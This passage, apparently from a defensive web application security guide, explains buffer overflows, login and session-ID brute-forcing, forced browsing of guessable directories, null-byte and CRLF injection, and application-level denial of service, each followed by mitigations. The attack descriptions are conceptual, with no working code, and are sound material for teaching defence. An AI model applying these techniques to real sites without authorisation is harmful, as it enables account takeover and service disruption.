
Buffer overflow flaws in custom web applications are less likely to be detected because there will normally be far fewer hackers trying to find and exploit such flaws in a specific application. If discovered in a custom application, the ability to exploit the flaw (other than to crash the application) is significantly reduced by the fact that the source code and detailed error messages for the application may not be available to the hacker. However, buffer overflow attacks against customized web applications can sometimes lead to interesting results. In some cases, we have discovered that sending large inputs can cause the web application or the back-end database to malfunction. Depending upon the component that is malfunctioning, and the severity of the malfunction, it is possible to cause a denial of service attack against the web site. In other cases, large inputs cause the web application to output an error message. Typically, this error message relates to a function in the code being unable to process the large amount of data. This can reveal critical information about the web technologies being used.

Almost all known web servers, application servers and web application environments are susceptible to buffer overflows, the notable exception being Java and J2EE environments, which are immune to these attacks (except for overflows in the JVM itself). 

Further reading
Aleph One,
"Smashing the Stack for fun and profit", http://www.phrack.com/show.php?p+49&a+14 Mark Donaldson,
"Inside the buffer Overflow Attack: Mechanism, method, & Prevention," http://rr.sans.org/code/inside_buffer.php 

Mitigation Techniques
Keep up with the latest bug reports for your web and application server products and other products in your Internet infrastructure. Apply the latest patches to these products. Periodically scan your website with one or more of the commonly available scanners that look for buffer overflow flaws in your server products and your custom web applications. For your custom application code, you need to review all code that accepts input from users via the HTTP request and ensure that it provides appropriate size checking on all such inputs. This should be done even for environments that are not susceptible to such attacks as overly large inputs that are uncaught may still cause denial of service or other operational problems.


Authentication And Authorization Attacks
Authentication mechanisms that do not prohibit multiple failed logins can be attacked using tools such as Brutus12. Similarly, if the web site uses HTTP Basic Authentication or does not pass session IDs over SSL (Secure Sockets Layer), an attacker can sniff the traffic to discover user's authentication and/or authorization credentials.

Since HTTP is a stateless protocol, web applications commonly maintain state using session IDs or transaction IDs stored in cookie on the user's system. Thus this session ID becomes the only way that the web application can determine the online identity of the user. If the session ID is stolen (say through XSS), or it can be predicted, then an attacker can take over a genuine user's online identity vis--vis the vulnerable web site. Where the algorithm used to generate the session ID is weak, it is trivial to write a Perl script to enumerate through the possible session ID space and break the application's authentication and authorization schemes. 

This was illustrated in a paper by David Endler [ref 9], "Brute-Force Exploitation of Web Application Session IDs", where he explains how session IDs of sites like www.123greetings.com, www.register.com, and others could be trivially brute-forced. Thus it was possible to access the unauthorized information simply by writing a Perl script that enumerated all possible IDs within a given range. The most pertinent point here is that although web application may have mechanisms to prevent a user from multiple password guessing attempts during authentication, they do not usually prevent a user from trying to brute-force sessions IDs by resubmitting the URLs

Another variation of an authorization attack is called as the 'Forced browsing' attack. In this case, the attacker tries to access a sensitive part of the web application without going through the prior stages of authentication. For instance, the attacker may try to access the orders.php page directly, without first having successfully logged in at the login.php page.

The attacker may also bypass the normal flow of the application, and try and access those parts of the web application, which would not normally be accessible. These could include log files, configuration files, or source code, or in some cases sensitive data such as query outputs, people directories with their phones and email addresses, Excel spreadsheets, etc. This is typically done by crawling through the website, trying to determine the directory structure being used, and guessing directories with typical names such as /log/, /modules/, /temp/, /tmp/, /include/, /cgi-bin/, /docs/, /old/, /debug/, /data/, /test/, etc. In the worst case scenario, the attacker may even get access to the web site administration interface, or a SQL query input form, which may have been part of the debugging stage.

Mitigation Techniques
Brute-forcing of the web application's authentication mechanism can be mitigated by ensuring that your application has the following controls in place:
Password complexity measures: does your application force users to choose complex passwords. 
Account lockout or timeout measures: does the application maintain state regarding previous failed logins in a given period of time. Ideally, the application should slow down the attacker's attempts after each failed login attempt. Also, after a preset number of failed login attempts, the user's account could be locked out for a specific period of time to prevent an attacker launching a series of password-guessing attacks.
Prevention of automated attacks: Scripted or automated brute-force attacks of the authentication component can be handled by introducing dynamically generated 'gif' images, which contain a string that the user must enter along with his username and password. It allows for a variation of the two-factor authentication method.

Session ID brute-forcing can be mitigated by ensuring you have chosen strong session ID generation techniques. See the "Authorization" section in "Security Techniques" of the guide for more information on this. Another important measure is to ensure that session IDs are expired after a pre-determined interval to prevent session IDs being hijacked. Moreover, you may add code within your web application to detect access to different session IDs from the same source IP address. Also, do not use predictable names for your folders, and then secure them using proper access control rather than choosing security by obscurity.

Other attacks that violate your site's authorization schemes can be mitigated by designing the access control right from the start, listing out the users and groups, and their required privilege levels. This should result in a formal access control policy for your website. 

A thorough penetration testing exercise may uncover any serious access control issues. If a source code audit is possible, then it is more likely to uncover logical flaws in the access control and authorization code.

An easy means of detecting a brute-force attempt against the authentication page or the session Id's is to code the web application in a way that it alerts the administrator for multiple failed logins for the same username or from the same IP address. However, this is not always a trivial exercise, and may not be possible in a web application that has already been developed and deployed.

In such a scenario, log analysis might reveal multiple accesses to the same page from the same IP address within a short period of time. Event correlation software such as Simple Event Correlator (SEC)13 can be used to define rules to parse through the logs and generate alerts based on aggregated events. This could also be done by adding a Snort rule for alerting on HTTP Authorization Failed error messages going out from your web server to the user, and SEC can then be used to aggregate and correlate these alerts.


Null byte and CRLF attacks
While web applications may be developed in a variety of programming languages, these applications often pass data to underlying lower level C-functions for further processing and functionality.

If a given string, lets say "AAA\0BBB" is accepted as a valid string by a web application (or specifically the programming language), it may be shortened to "AAA" by the underlying C-functions. This occurs because C/C++ perceives the null byte (\0) as the termination of a string. Applications that do not perform adequate input validation can be fooled by inserting null bytes in "critical" parameters. This is normally done by URL Encoding the null bytes (%00). In special cases it is possible to use Unicode characters.

The attack can be used to:
Disclose physical paths, files and OS-information
Truncate strings
Truncate Paths
Truncate Files
Truncate Commands
Truncate Command parameters
Bypass validity checks, looking for substrings in parameters
Cut off strings passed to SQL Queries

The most popular affected scripting and programming languages are:
Perl (highly)
Java (File, RandomAccessFile and similar Java-Classes)
PHP (depending on its configuration, which is covered in 'Language Specific Security')

Another similar attack works by injecting the carriage-return (CR) and linefeed (LF) characters into user input. If say, the user input is being used to make entries in the application or web server's log files, entering the CRLF characters may potentially allow the attacker to write log entries of his choice into the log files.

Mitigation techniques
Preventing null byte attacks requires that all input be validated before the application acts upon it. The same applies for CRLF as well. This could be done using the mod_security directive 'SecFilterByteRange 32 126', which allows only ASCII characters 32 to 126 as valid input.


Denial of Service attacks
Denial of Service (DoS) attacks have been primarily targeted against known software, with vulnerabilities that would allow the DoS attack to succeed. Traditionally, DoS attacks have been rarely useful against custom web applications. However, there are techniques that can be used to create DoS situations by exploiting web application vulnerabilities. 

The easiest way in which a DoS attack can be launched against an application is to overwhelm the transaction processing capability of the application using automated scripts. For instance, if the account creation page is a simple HTML form, an attacker can write a script to create thousands of accounts per day, and quickly fill up the back-end database. It will also eat up the application or web servers response capability to genuine users. This technique could be used not just for creating new account, but also for multiple logins for the same account, multiple bogus transactions, and any other processing module that the attacker can call in an automated fashion.

A common denial of service attack against operating systems is to lockout user accounts if an account lockout policy is in place. The same technique could be used against a web application as well, if it locks out user accounts after a pre-determined interval of failed authentication attempts. Using an automated script, an attacker would try to enumerate various user accounts and lock them out.

Other denial of service technique may simply involve using any of the attack vectors described in this section, if that particular attack causes resource starvation or an application crash. For instance, feeding a large buffer into a susceptible component of the web application may cause it to either crash that component or the web application itself.

Mitigation techniques
One of the most widely used mitigation techniques is the one mentioned in the session ID brute-forcing mitigation section. The account creation or transaction confirmation page should contain a dynamically generated image, which displays a string that the user must enter in order to continue with the transaction.

To mitigate against malicious account lockouts of the application users, ensure that it is extremely difficult for an attacker to enumerate valid user accounts in the first place. If for some reason, the application is built in a way where it is not possible to prevent users from knowing the user IDs of other users (say a web-based emails service), then ensure that the after say 3 failed logins, the user must type in the authentication credentials along with the dynamically generated string image. This will drastically slow down an attacker. After 3 more failed logins at this stage, the user's account will be locked out. The application could then provide a means for the user to unlock his/her account using the same mechanism used in the 'forgot password' scheme.

Another option might be to use mod_throttle with Apache, or the RLimitCPU, RlimitMem, RlimitNProc directives of Apache.

Further reading:
http://www.corsaire.com/white-papers/040405-application-level-dos-attacks.pdf 

